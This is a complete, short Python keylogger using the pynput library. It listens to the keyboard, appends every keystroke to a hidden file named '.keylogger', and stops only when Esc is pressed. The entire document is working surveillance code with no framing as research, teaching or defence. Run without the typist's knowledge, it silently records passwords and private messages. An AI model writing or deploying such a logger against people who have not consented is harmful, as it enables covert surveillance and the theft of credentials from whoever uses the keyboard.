from pynput.keyboard import Key, Listener
file = open(".keylogger", "a")

def on_press(key):
    file.write('{0} '.format(key))

def on_release(key):
    if key == Key.esc:
        # Stop listener
        file.close()
        return False

# Collect events until released
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
